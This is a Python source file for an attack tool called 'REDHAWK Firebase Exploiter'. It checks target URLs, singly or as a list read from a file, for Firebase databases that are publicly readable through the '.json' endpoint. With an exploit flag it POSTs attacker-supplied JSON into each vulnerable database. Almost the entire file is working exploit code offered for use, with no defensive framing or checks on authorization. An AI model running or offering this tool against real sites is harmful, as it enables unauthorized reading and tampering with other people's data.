import json
import requests
import argparse
import os
import sys
from colorama import init, Fore

# Initialize colorama
init()

BANNER = Fore.RED + """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡰⠒⠈⠀⠀⠀⠀⠀⠀⠀⠑⢄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⡌⠄⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⢀⣀⣀⣤⣤⡤⣤⣶⢷⡿⢃⡤⠆⠊⠀⠢⡀⠀
⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠺⠿⣤⣅⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⡄
⠀⠀⠀⠇⠀⠠⠀⢀⡔⠀⠀⢀⠀⠈⠟⣛⣻⣣⣤⣬⠭⠀⠤⠤⠤⢆⠀⠀
⠀⠀⡜⡠⢂⢀⡴⠋⠀⠠⠊⠉⢀⣀⣤⣾⣿⣿⡟⠋⠀⠀⠀⠀⠀⢠⠔⠁
⠀⢠⣿⣧⣿⠟⢀⠄⡀⠀⠀⢀⣾⣿⣿⣿⣿⢛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣽⣿⣿⣿⡶⣥⠞⡰⣀⣰⣿⣿⣿⣿⣿⣿⠀⢖⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⣿⣯⣼⣿⣿⣿⣿⣿⠟⣿⣿⣿⣿⡏⠀⣨⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡿⣿⣿⣿⣿⣿⣿⣿⣵⣣⣼⣿⣿⣿⣿⣿⣦⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢹⣿⣿⣿⡿⢿⣿⣿⣿⡿⢻⠟⢿⣿⠛⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⠋⠋⠀⢿⣿⡟⠁⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
REDHAWK 🔥 FIREBASE EXPLOITER v1.0
"""+ Fore.RESET

def check_json(url, cmd, exploit, path):
    if not url.startswith("https://"):
        url = "https://" + url
    if not url.endswith("/"):
        url += "/"
    try:
        resp = requests.get(url + ".json")
        if resp.status_code == 200:
            print(Fore.GREEN + "[Firehawk🔥] {} [status Pass] - Firebase Possibly Vulnerable".format(url))
            if exploit:
                exploit_json(url, path)
        elif resp.status_code != 200 and cmd == "standalone":
            print(Fore.YELLOW + "[Firehawk🔥] {} [status Fail] - Firebase Not Vulnerable".format(url))
    except requests.exceptions.RequestException as e:
        print(Fore.RED + "[Firehawk🔥] {} [status Fail] - Failed to connect".format(url))

def is_json(s):
    try:
        json.loads(s)
        return True
    except ValueError:
        return False

def exploit_json(url, path):
    try:
        with open("firehawk.json", "r") as file:
            file_content = file.read()
            if not is_json(file_content):
                print(Fore.RED + "[Firehawk🔥] {} [status Fail] - File 'firehawk.json' is not in proper JSON format".format(url))
                return
            resp = requests.post(url + path + ".json", headers={"Content-Type": "application/json"}, data=file_content)
            if resp.status_code == 200:
                print(Fore.GREEN + "[Firehawk🔥] {} [Pass] - Exploited URL - ".format(url) + url + path + ".json")
            else:
                print(Fore.YELLOW + "[Firehawk🔥] {} [Fail] - Exploit Failed For - ".format(url) + url + path + ".json")
    except FileNotFoundError:
        print(Fore.RED + "[Firehawk🔥] {} [status Fail] - File 'firehawk.json' does not exist".format(url))
        sys.exit(-1)

def main():
    parser = argparse.ArgumentParser(description="FirebaseExploiter")
    parser.add_argument("-url", help="Target URL")
    parser.add_argument("-file", help="File Path")
    parser.add_argument("-exploit", action="store_true", help="Exploit")
    parser.add_argument("-path", default="firehawk🔥", help="URI Path For Exploit")
    args = parser.parse_args()

    print(BANNER)

    if not args.url and not args.file:
        parser.print_help()
        sys.exit(-1)

    if args.url:
        check_json(args.url, "standalone", args.exploit, args.path)

    if not args.url and args.file:
        try:
            with open(args.file, "r") as f:
                for line in f:
                    check_json(line.strip(), "file", args.exploit, args.path)
        except FileNotFoundError:
            print(Fore.RED + "[Firehawk🔥] File not found:", args.file)
            sys.exit(-1)

if __name__ == "__main__":
    main()

